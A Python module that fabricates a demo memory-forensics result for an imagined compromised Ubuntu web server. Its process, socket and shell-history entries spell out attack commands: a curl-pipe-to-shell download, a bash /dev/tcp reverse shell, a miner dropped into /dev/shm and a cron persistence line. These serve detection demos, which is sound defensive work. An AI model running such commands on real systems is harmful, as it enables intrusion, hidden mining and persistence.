"""Linux DEMO investigation: made-up data in the shape of a real result, so every view can be seen before the Linux engine exists.

NOTHING HERE IS ANALYSIS. The host ``web-prod-01``, its processes, sockets, memory regions, shell history, findings and plugin rows are invented, and the result says so
(``tool_info["demo"]``, a warning, and a banner in the dashboard). It is built directly as an :class:`AnalysisResult`: the Linux normalizer and rules do not exist yet, and the
demo must keep working while they are written. The story: a web server worker starts a shell that downloads a script and opens a reverse shell; a cryptocurrency miner hides as
``[kworker/0:2]`` in /dev/shm; a process is hidden from the task list; a kernel module hides itself; cron is used for persistence.

Delete this file (and ``LinuxEngine.demo_result`` / ``Capabilities.demo``) when it is no longer wanted; nothing else depends on it.
"""
from __future__ import annotations

from typing import Dict, List

from app.analysis.indicators.scoring import finding_score
from app.models import AnalysisResult, DLL, EvidenceItem, Indication, MemoryRegion, NetworkConnection, PluginResult, Process, TimelineEvent

HOST = "web-prod-01"
CAPTURE = "2026-03-14T02:31:07+00:00"
BOOT = "2026-03-02T06:12:00+00:00"
DUMP = "demo-linux-web-prod-01.lime"
BANNER = "Linux version 5.15.0-91-generic (buildd@lcy02-amd64-045) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023"

# names and descriptions of the demo rules (the Linux rules themselves are still to be written; the real catalog takes precedence)
RULE_NAMES: Dict[str, str] = {
    "LNX-PT-001": "Shell started by a web server worker", "LNX-CL-001": "Reverse-shell command line", "LNX-CL-002": "Download piped into a shell",
    "LNX-NET-001": "Interactive shell with an external connection", "LNX-NET-002": "Connection to a mining-pool port", "LNX-PR-001": "Program running from /dev/shm",
    "LNX-PR-002": "Process named like a kernel thread that is not one", "LNX-MEM-001": "Executable anonymous memory with an ELF header",
    "LNX-PT-003": "Process in the scan but not in the task list", "LNX-LIB-001": "Library preloaded from outside the system folders",
    "LNX-KERN-001": "Kernel module that is not in the module list", "LNX-PER-001": "Cron entry that runs a script from /tmp",
    "LNX-HIST-001": "Shell history: download, make executable, run",
}
RULE_DESCRIPTIONS: Dict[str, str] = {
    "LNX-PT-001": "A web server worker (nginx, apache, php-fpm) has no reason to start a shell. It is how a web shell or an exploited application runs commands.",
    "LNX-PR-001": "Programs that run from /dev/shm, /tmp or /var/tmp were not installed: they were dropped. /dev/shm is memory-backed and leaves nothing on disk.",
    "LNX-PR-002": "Kernel threads are children of kthreadd (PID 2) and have no executable. A user-space process with a bracketed kworker name is hiding in the process list.",
    "LNX-MEM-001": "Anonymous executable memory that starts with an ELF header is a program mapped from memory instead of from a file: injection or fileless execution.",
}


def _t(day: int, hour: int, minute: int, second: int = 0) -> str:
    return f"2026-03-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}+00:00"


def _process(pid, ppid, name, path, cmdline, user, created, threads=1, exited="", hidden=False, session=-1) -> Process:
    proc = Process(pid=pid, ppid=ppid, name=name, path=path, image_base="", user=user, session=session, create_time=created, command_line=cmdline, threads=threads,
                   exit_time=exited, exited=bool(exited), hidden=hidden, offset=hex(0xFFFF9C0100000000 + pid * 0x1000),
                   source="psscan" if hidden else "pslist")
    proc.provenance = {"command_line": {"plugin": "linux.psaux.PsAux", "row": pid}}
    return proc


def _libs(proc: Process, *libs) -> None:
    for i, (name, path) in enumerate(libs):
        proc.dlls.append(DLL(name=name, path=path, base=hex(0x7F3A00000000 + i * 0x200000), size="0x1c0000", load_time=proc.create_time))


def _connection(procs: Dict[int, Process], pid, proto, laddr, lport, raddr, rport, state, when) -> NetworkConnection:
    proc = procs[pid]
    conn = NetworkConnection(pid, proc.name, laddr, str(lport), raddr, str(rport) if rport else "", state, proto, ["linux.sockstat.Sockstat"], created=when)
    proc.network.append(conn)
    return conn


def _finding(rule_id, severity, title, summary, reasons, evidence, pid=0, process="", plugins=("linux.pslist.PsList",), confidence="Medium", category="process") -> Indication:
    return Indication(
        title=title, severity=severity, process_pid=pid, process_name=process, summary=summary, description=RULE_DESCRIPTIONS.get(rule_id, summary), reasons=list(reasons),
        evidence=list(evidence), source_plugins=list(plugins), rule_id=rule_id, confidence=confidence, score=finding_score(severity, confidence), category=category,
        evidence_items=[EvidenceItem("process" if pid else "kernel", "pid" if pid else "module", str(pid or evidence[0]), process, plugins[0], -1)])


def build() -> AnalysisResult:
    P: List[Process] = []
    add = P.append
    # ------------------------------------------------------------------ the system
    add(_process(1, 0, "systemd", "/usr/lib/systemd/systemd", "/sbin/init", "root", BOOT, 1))
    add(_process(2, 0, "kthreadd", "", "[kthreadd]", "root", BOOT, 1))
    for pid, name in ((3, "rcu_gp"), (4, "rcu_par_gp"), (6, "kworker/0:0H"), (9, "mm_percpu_wq"), (10, "ksoftirqd/0"), (11, "rcu_sched"), (12, "migration/0"), (61, "kworker/0:1")):
        add(_process(pid, 2, name, "", f"[{name}]", "root", BOOT, 1))
    add(_process(328, 1, "systemd-journal", "/usr/lib/systemd/systemd-journald", "/lib/systemd/systemd-journald", "root", "2026-03-02T06:12:04+00:00", 1))
    add(_process(360, 1, "systemd-udevd", "/usr/bin/udevadm", "/lib/systemd/systemd-udevd", "root", "2026-03-02T06:12:05+00:00", 1))
    add(_process(612, 1, "cron", "/usr/sbin/cron", "/usr/sbin/cron -f -P", "root", "2026-03-02T06:12:21+00:00", 1))
    add(_process(633, 1, "rsyslogd", "/usr/sbin/rsyslogd", "/usr/sbin/rsyslogd -n -iNONE", "syslog", "2026-03-02T06:12:21+00:00", 4))
    add(_process(641, 1, "dbus-daemon", "/usr/bin/dbus-daemon", "@dbus-daemon --system --address=systemd: --nofork --nopidfile", "messagebus", "2026-03-02T06:12:21+00:00", 1))
    add(_process(655, 1, "systemd-logind", "/usr/lib/systemd/systemd-logind", "/lib/systemd/systemd-logind", "root", "2026-03-02T06:12:22+00:00", 1))
    add(_process(702, 1, "sshd", "/usr/sbin/sshd", "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups", "root", "2026-03-02T06:12:30+00:00", 1))
    add(_process(745, 1, "fail2ban-server", "/usr/bin/python3.10", "/usr/bin/python3 /usr/bin/fail2ban-server -xf start", "root", "2026-03-02T06:12:41+00:00", 5))
    add(_process(881, 1, "nginx", "/usr/sbin/nginx", "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;", "root", "2026-03-02T06:12:55+00:00", 1))
    add(_process(882, 881, "nginx", "/usr/sbin/nginx", "nginx: worker process", "www-data", "2026-03-02T06:12:55+00:00", 1))
    add(_process(883, 881, "nginx", "/usr/sbin/nginx", "nginx: worker process", "www-data", "2026-03-02T06:12:55+00:00", 1))
    add(_process(912, 1, "mysqld", "/usr/sbin/mysqld", "/usr/sbin/mysqld", "mysql", "2026-03-02T06:13:02+00:00", 38))
    add(_process(1033, 1, "gunicorn", "/usr/bin/python3.10", "/usr/bin/python3 /usr/local/bin/gunicorn -w 2 -b 127.0.0.1:8000 shop:app", "app", "2026-03-02T06:13:10+00:00", 1))
    add(_process(1040, 1033, "gunicorn", "/usr/bin/python3.10", "/usr/bin/python3 /usr/local/bin/gunicorn -w 2 -b 127.0.0.1:8000 shop:app", "app", "2026-03-02T06:13:11+00:00", 3))
    add(_process(1041, 1033, "gunicorn", "/usr/bin/python3.10", "/usr/bin/python3 /usr/local/bin/gunicorn -w 2 -b 127.0.0.1:8000 shop:app", "app", "2026-03-02T06:13:11+00:00", 3))
    # ------------------------------------------------------------------ the administrator's session
    add(_process(2301, 702, "sshd", "/usr/sbin/sshd", "sshd: admin [priv]", "root", _t(13, 22, 40, 12), 1))
    add(_process(2320, 2301, "sshd", "/usr/sbin/sshd", "sshd: admin@pts/0", "admin", _t(13, 22, 40, 13), 1))
    add(_process(2321, 2320, "bash", "/usr/bin/bash", "-bash", "admin", _t(13, 22, 40, 14), 1))
    add(_process(2444, 2321, "vim", "/usr/bin/vim.basic", "vim /etc/nginx/sites-enabled/default", "admin", _t(14, 2, 12, 40), 1))
    # ------------------------------------------------------------------ the attack
    add(_process(4188, 883, "sh", "/usr/bin/dash", "sh -c curl -s http://45.77.65.211/x.sh | sh", "www-data", _t(14, 1, 58, 12), 1))
    add(_process(4190, 4188, "curl", "/usr/bin/curl", "curl -s http://45.77.65.211/x.sh", "www-data", _t(14, 1, 58, 12), 1, exited=_t(14, 1, 58, 13)))
    add(_process(4210, 4188, "bash", "/usr/bin/bash", "bash -c bash -i >& /dev/tcp/185.220.101.4/4444 0>&1", "www-data", _t(14, 1, 58, 15), 1))
    add(_process(4233, 4210, "python3", "/usr/bin/python3.10", "python3 -c import pty; pty.spawn('/bin/bash')", "www-data", _t(14, 2, 3, 40), 1))
    add(_process(4234, 4233, "bash", "/usr/bin/bash", "/bin/bash", "www-data", _t(14, 2, 3, 41), 1))
    add(_process(4377, 1, "[kworker/0:2]", "/dev/shm/.kworker (deleted)", "/dev/shm/.kworker -o stratum+tcp://pool.minexmr.example:3333 -u 4A9xMgdemo -p x --donate-level 1", "root", _t(14, 2, 9, 51), 6))
    add(_process(4401, 612, "sh", "/usr/bin/dash", "/bin/sh -c /tmp/.u.sh", "root", _t(14, 2, 20, 0), 1, exited=_t(14, 2, 20, 2)))
    add(_process(4411, 1, ".sshd-helper", "/usr/sbin/.sshd-helper", ".sshd-helper -d", "root", _t(14, 2, 22, 30), 2, hidden=True))
    by_pid = {p.pid: p for p in P}

    # ------------------------------------------------------------------ libraries (the "DLLs" of Linux)
    libc = ("libc.so.6", "/usr/lib/x86_64-linux-gnu/libc.so.6")
    for proc in P:
        if proc.path and proc.pid not in (4377, 4411):
            _libs(proc, ("ld-linux-x86-64.so.2", "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"), libc)
    for pid in (881, 882, 883):
        _libs(by_pid[pid], ("libssl.so.3", "/usr/lib/x86_64-linux-gnu/libssl.so.3"), ("libcrypto.so.3", "/usr/lib/x86_64-linux-gnu/libcrypto.so.3"), ("libpcre2-8.so.0", "/usr/lib/x86_64-linux-gnu/libpcre2-8.so.0"))
    for pid in (745, 1033, 1040, 1041, 4233):
        _libs(by_pid[pid], ("libpython3.10.so.1.0", "/usr/lib/x86_64-linux-gnu/libpython3.10.so.1.0"), ("libz.so.1", "/usr/lib/x86_64-linux-gnu/libz.so.1"))
    pre = DLL(name="libprocesshider.so", path="/usr/local/lib/libprocesshider.so", base="0x7f3a1c200000", size="0x6000", suspicious=True, load_time=_t(14, 1, 58, 15))
    by_pid[4210].dlls.append(pre)

    # ------------------------------------------------------------------ sockets
    C: List[NetworkConnection] = []
    for args in ((702, "TCP", "0.0.0.0", 22, "0.0.0.0", 0, "LISTEN", BOOT), (881, "TCP", "0.0.0.0", 80, "0.0.0.0", 0, "LISTEN", BOOT), (881, "TCP", "0.0.0.0", 443, "0.0.0.0", 0, "LISTEN", BOOT),
                 (912, "TCP", "127.0.0.1", 3306, "0.0.0.0", 0, "LISTEN", BOOT), (1033, "TCP", "127.0.0.1", 8000, "0.0.0.0", 0, "LISTEN", BOOT),
                 (883, "TCP", "10.0.2.15", 443, "91.108.4.12", 51234, "ESTABLISHED", _t(14, 2, 29, 40)), (882, "TCP", "10.0.2.15", 443, "78.46.12.9", 40722, "ESTABLISHED", _t(14, 2, 30, 11)),
                 (1040, "TCP", "127.0.0.1", 40118, "127.0.0.1", 3306, "ESTABLISHED", _t(14, 2, 30, 50)), (2320, "TCP", "10.0.2.15", 22, "192.168.1.50", 50544, "ESTABLISHED", _t(13, 22, 40, 12)),
                 (4210, "TCP", "10.0.2.15", 38722, "185.220.101.4", 4444, "ESTABLISHED", _t(14, 1, 58, 15)), (4377, "TCP", "10.0.2.15", 52214, "51.222.81.17", 3333, "ESTABLISHED", _t(14, 2, 9, 53))):
        C.append(_connection(by_pid, *args))

    # ------------------------------------------------------------------ memory: the miner is a program mapped from memory
    elf = "7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 03 00 3e 00 01 00 00 00 40 1b 00 00 00 00 00 00"
    region = MemoryRegion(4377, "[kworker/0:2]", "0x7f3a10000000", "0x7f3a10a3ffff", "0xa40000", "rwx", True, True, True, True, "linux.malfind.Malfind",
                          {"Hexdump": elf, "Disasm": "7f 45 4c 46 ..."}, "anon")
    second = MemoryRegion(4377, "[kworker/0:2]", "0x7f3a14000000", "0x7f3a1401ffff", "0x20000", "rwx", True, True, True, True, "linux.malfind.Malfind",
                          {"Hexdump": "48 31 c0 48 89 c7 48 89 c6 48 89 c2 0f 05 90 90", "Disasm": "xor rax, rax; mov rdi, rax ..."}, "anon")
    by_pid[4377].memory_regions += [region, second]
    for proc, kinds in ((by_pid[4210], {"File": 4, "Socket": 3, "Pipe": 2}), (by_pid[4377], {"File": 3, "Socket": 2}), (by_pid[882], {"File": 38, "Socket": 6}), (by_pid[912], {"File": 120, "Socket": 9})):
        proc.handle_summary = dict(kinds)
    by_pid[4377].handles = [{"type": "File", "name": "/dev/shm/.kworker (deleted)", "value": "0x3", "access": 0}, {"type": "Socket", "name": "TCP 10.0.2.15:52214 → 51.222.81.17:3333", "value": "0x5", "access": 0}]
    by_pid[4210].handles = [{"type": "Socket", "name": "TCP 10.0.2.15:38722 → 185.220.101.4:4444", "value": "0x0", "access": 0}, {"type": "File", "name": "/dev/pts/1", "value": "0x1", "access": 0}]
    by_pid[882].handles = [{"type": "File", "name": "/var/log/nginx/access.log", "value": "0x5", "access": 1}]

    # ------------------------------------------------------------------ findings
    F: List[Indication] = [
        _finding("LNX-PT-001", "High", "sh was started by an nginx worker", "A web server worker started a shell that downloads and runs a script.",
                 ["Parent nginx (PID 883) is a web server worker", "sh -c curl ... | sh"], ["sh (PID 4188) ← nginx: worker process (PID 883) as www-data", "curl -s http://45.77.65.211/x.sh | sh"], 4188, "sh"),
        _finding("LNX-CL-002", "Medium", "Download piped into a shell", "The command line fetches a script and feeds it to a shell without saving it.", ["Command line contains 'curl … | sh'"],
                 ["sh -c curl -s http://45.77.65.211/x.sh | sh"], 4188, "sh", ("linux.psaux.PsAux",)),
        _finding("LNX-CL-001", "High", "Reverse-shell command line", "bash redirects its input and output to a TCP connection: an interactive reverse shell.", ["/dev/tcp/<ip>/<port> redirection"],
                 ["bash -c bash -i >& /dev/tcp/185.220.101.4/4444 0>&1"], 4210, "bash", ("linux.psaux.PsAux",), "High", "commandline"),
        _finding("LNX-NET-001", "High", "bash holds a connection to 185.220.101.4:4444", "An interactive shell with a connection to a public address on an unusual port.",
                 ["Shell process with an external connection", "Port 4444 is a default of reverse-shell tools"], ["TCP 10.0.2.15:38722 → 185.220.101.4:4444 ESTABLISHED"], 4210, "bash",
                 ("linux.sockstat.Sockstat",), "High", "network"),
        _finding("LNX-LIB-001", "Medium", "libprocesshider.so is preloaded into bash", "A library from /usr/local/lib that is not part of the distribution is loaded into the shell: it can hide processes from ps.",
                 ["Not a system library", "Loaded through LD_PRELOAD / ld.so.preload"], ["/usr/local/lib/libprocesshider.so"], 4210, "bash", ("linux.library_list.LibraryList",), "Medium", "module"),
        _finding("LNX-PR-001", "High", "[kworker/0:2] runs from /dev/shm", "A program runs from memory-backed storage and its file has been deleted.", ["Image path /dev/shm/.kworker (deleted)", "Not installed by a package"],
                 ["/dev/shm/.kworker -o stratum+tcp://pool.minexmr.example:3333 …"], 4377, "[kworker/0:2]", ("linux.pslist.PsList", "linux.psaux.PsAux"), "High", "path"),
        _finding("LNX-PR-002", "High", "[kworker/0:2] is not a kernel thread", "The name looks like a kernel worker, but the parent is PID 1 (not kthreadd) and the process has an executable.",
                 ["Kernel threads are children of kthreadd (PID 2)", "A real kworker has no command line arguments"], ["[kworker/0:2] (PID 4377) ← systemd (PID 1)"], 4377, "[kworker/0:2]", category="process"),
        _finding("LNX-MEM-001", "High", "Executable anonymous memory with an ELF header", "Two RWX regions that are not backed by a file; the first one starts with 7f 45 4c 46 (ELF).", ["Private, executable and writable",
                 "Starts with an ELF header: a program mapped from memory"], ["0x7f3a10000000–0x7f3a10a3ffff rwx anon", "0x7f3a14000000–0x7f3a1401ffff rwx anon (shellcode-like)"], 4377, "[kworker/0:2]",
                 ("linux.malfind.Malfind",), "High", "memory"),
        _finding("LNX-NET-002", "Medium", "Connection to a mining-pool port", "A process outside the usual software connects to a public address on port 3333, the default of stratum mining pools.", ["Port 3333"],
                 ["TCP 10.0.2.15:52214 → 51.222.81.17:3333 ESTABLISHED"], 4377, "[kworker/0:2]", ("linux.sockstat.Sockstat",), "Medium", "network"),
        _finding("LNX-PT-003", "Medium", ".sshd-helper is in the scan but not in the task list", "The process structure was found by scanning memory, has no exit time and is not linked into the task list: unlinked (hidden) or caught while exiting.",
                 ["Found by linux.psscan only", "Created 2 minutes before the capture"], [".sshd-helper (PID 4411) created 2026-03-14T02:22:30+00:00"], 4411, ".sshd-helper", ("linux.psscan.PsScan", "linux.pslist.PsList"), "Medium"),
        _finding("LNX-KERN-001", "Medium", "Kernel module diamorphine is not in the module list", "linux.hidden_modules found a module in memory that lsmod does not list: a module that unlinked itself.",
                 ["Found by scanning, absent from linux.lsmod"], ["diamorphine @ 0xffffffffc0a41000 (size 0x4000)"], 0, "", ("linux.hidden_modules.Hidden_modules", "linux.lsmod.Lsmod"), "Medium", "kernel"),
        _finding("LNX-PER-001", "Medium", "A cron entry runs /tmp/.u.sh", "/etc/cron.d/.sysupd starts a script from /tmp every minute.", ["Script in /tmp", "Hidden file name in /etc/cron.d"],
                 ["* * * * * root /tmp/.u.sh"], 0, "", ("linux.pagecache.Files",), "Medium", "persistence"),
        _finding("LNX-HIST-001", "Medium", "root's shell history: download, chmod, run", "The recovered bash history contains the commands that installed the miner.", ["wget … -O /dev/shm/.kworker", "chmod +x", "nohup"],
                 ["wget http://45.77.65.211/.k -O /dev/shm/.kworker; chmod +x /dev/shm/.kworker; nohup /dev/shm/.kworker -o stratum+tcp://… &"], 4234, "bash", ("linux.bash.Bash",), "Medium", "execution"),
    ]
    F.append(Indication(
        title="5 independent kinds of evidence point at [kworker/0:2]", severity="High", process_pid=4377, process_name="[kworker/0:2]", confidence="High",
        summary="Different artifact types (path, process tree, memory, network, history) all produced leads for the same process. A prioritisation aid, not a verdict.",
        description="Correlation finding. Review the linked rules and their evidence.", reasons=[f"{f.rule_id}: {f.title}" for f in F if f.process_pid == 4377],
        evidence=["[kworker/0:2] (PID 4377)"], source_plugins=["linux.pslist.PsList", "linux.malfind.Malfind", "linux.sockstat.Sockstat"], rule_id="CORR-001", category="correlation",
        related_processes=["[kworker/0:2] (PID 4377)"], score=finding_score("High", "High")))
    F.sort(key=lambda f: ({"High": 0, "Medium": 1, "Low": 2}.get(f.severity, 3), -f.score, f.process_pid))

    # ------------------------------------------------------------------ timeline
    top = {}
    for f in F:
        if f.process_pid:
            top[f.process_pid] = max(top.get(f.process_pid, ""), f.severity, key=lambda s: {"": 0, "Low": 1, "Medium": 2, "High": 3}.get(s, 0))
    events: List[TimelineEvent] = []
    for p in P:
        if p.pid > 2 and p.ppid != 2:
            events.append(TimelineEvent(p.create_time, "Process started", f"Process {p.name} (PID {p.pid}), parent {p.ppid}", p.pid, "linux.pslist.PsList", category="Process", process=p.name, severity=top.get(p.pid, "")))
        if p.exit_time:
            events.append(TimelineEvent(p.exit_time, "Process exited", f"{p.name} (PID {p.pid}) exited", p.pid, "linux.pslist.PsList", category="Process", process=p.name, severity=top.get(p.pid, "")))
    for c in C:
        if c.state == "ESTABLISHED":
            events.append(TimelineEvent(c.created, "Network", f"{c.protocol} {c.local} → {c.remote} {c.state}", c.pid, "linux.sockstat.Sockstat", category="Network", process=c.process, severity=top.get(c.pid, "")))
    for when, text in ((_t(14, 1, 58, 11), "root's history: curl http://45.77.65.211/x.sh"), (_t(14, 2, 8, 30), "wget http://45.77.65.211/.k -O /dev/shm/.kworker"),
                       (_t(14, 2, 9, 40), "chmod +x /dev/shm/.kworker"), (_t(14, 2, 9, 51), "nohup /dev/shm/.kworker -o stratum+tcp://pool.minexmr.example:3333 &"),
                       (_t(14, 2, 19, 55), "echo '* * * * * root /tmp/.u.sh' > /etc/cron.d/.sysupd")):
        events.append(TimelineEvent(when, "Shell history", text, 4234, "linux.bash.Bash", category="Execution", process="bash", severity="Medium"))
    events.append(TimelineEvent(_t(14, 2, 21, 4), "Kernel module loaded", "diamorphine (hidden: not in lsmod)", 0, "linux.hidden_modules.Hidden_modules", category="Module", severity="Medium"))
    events.append(TimelineEvent(_t(14, 2, 19, 56), "File modified", "/etc/cron.d/.sysupd", 0, "linux.pagecache.Files", category="File time", severity="Medium"))
    events.append(TimelineEvent(CAPTURE, "Memory captured", "Memory image captured", 0, "banners.Banners", category="System"))
    events.sort(key=lambda e: e.timestamp)

    # ------------------------------------------------------------------ raw plugin output (what the Plugin Output view shows)
    def pslist_rows(include_hidden: bool):
        return [{"OFFSET (V)": int(p.offset, 16), "PID": p.pid, "TID": p.pid, "PPID": p.ppid, "COMM": p.name, "UID": 0 if p.user == "root" else 33, "GID": 0 if p.user == "root" else 33,
                 "EUID": 0 if p.user == "root" else 33, "EGID": 0 if p.user == "root" else 33, "CREATION TIME": p.create_time, "File output": "Disabled"}
                for p in P if include_hidden or not p.hidden]
    plugins = [
        PluginResult("banners.Banners", "Completed", [{"Offset": 0x1A00000, "Banner": BANNER}], duration=2.1),
        PluginResult("linux.pslist.PsList", "Completed", pslist_rows(False), duration=9.4),
        PluginResult("linux.psscan.PsScan", "Completed", pslist_rows(True), duration=21.7),
        PluginResult("linux.psaux.PsAux", "Completed", [{"PID": p.pid, "PPID": p.ppid, "COMM": p.name, "ARGS": p.command_line} for p in P if not p.hidden], duration=11.2),
        PluginResult("linux.sockstat.Sockstat", "Completed", [{"NetNS": 4026531840, "Process Name": c.process, "PID": c.pid, "TID": c.pid, "FD": 3 + i, "Sock Offset": 0xFFFF9C0200000000 + i * 0x100,
                                                               "Family": "AF_INET", "Type": "STREAM", "Proto": "TCP", "Source Addr": c.local_address, "Source Port": int(c.local_port),
                                                               "Destination Addr": c.remote_address, "Destination Port": int(c.remote_port or 0), "State": c.state, "Filter": "-"} for i, c in enumerate(C)], duration=6.0),
        PluginResult("linux.malfind.Malfind", "Completed", [{"PID": 4377, "Process": "[kworker/0:2]", "Start": r.start, "End": r.end, "Protection": "rwx", "Hexdump": r.details["Hexdump"], "Disasm": r.details["Disasm"]}
                                                          for r in by_pid[4377].memory_regions], duration=64.0),
        PluginResult("linux.bash.Bash", "Completed", [{"PID": 4234, "Process": "bash", "CommandTime": e.timestamp, "Command": e.description} for e in events if e.event_type == "Shell history"], duration=8.8),
        PluginResult("linux.lsmod.Lsmod", "Completed", [{"Offset": 0xFFFFFFFFC0B00000 + i * 0x10000, "Name": n, "Size": s} for i, (n, s) in enumerate((("nf_tables", 262144), ("ip_tables", 32768), ("virtio_net", 61440), ("ext4", 987136)))], duration=1.4),
        PluginResult("linux.hidden_modules.Hidden_modules", "Completed", [{"Offset": 0xFFFFFFFFC0A41000, "Module Name": "diamorphine", "Code Size": 16384, "Taints": "OOT_MODULE"}], duration=48.0),
    ]

    system_info = [{"Variable": k, "Value": v} for k, v in (
        ("Operating system", "Ubuntu 22.04.3 LTS"), ("Hostname", HOST), ("Kernel", "5.15.0-91-generic"), ("Architecture", "x86_64"), ("SystemTime", CAPTURE), ("Uptime", "12 days 20 h"),
        ("Processors", "4"), ("Memory", "8 GiB"), ("Banner", BANNER))]
    counts: Dict[str, int] = {}
    for p in P:
        counts[p.user] = counts.get(p.user, 0) + 1
    result = AnalysisResult(
        dump_path=DUMP, processes=P, indications=F, plugins=plugins, memory_regions=[r for p in P for r in p.memory_regions], timeline=events, system_info=system_info,
        users=sorted(counts), connections=C, accounts=[{"sid": f"user {name}", "name": name, "processes": n} for name, n in sorted(counts.items())], capture_time=CAPTURE,
        warnings=["DEMO DATA: this investigation is made up to show how a Linux result looks. No memory image was analysed."], target_os="linux",
        tool_info={"demo": "made-up data (app/engines/linux/demo.py)", "analysed": "demo"})
    return result
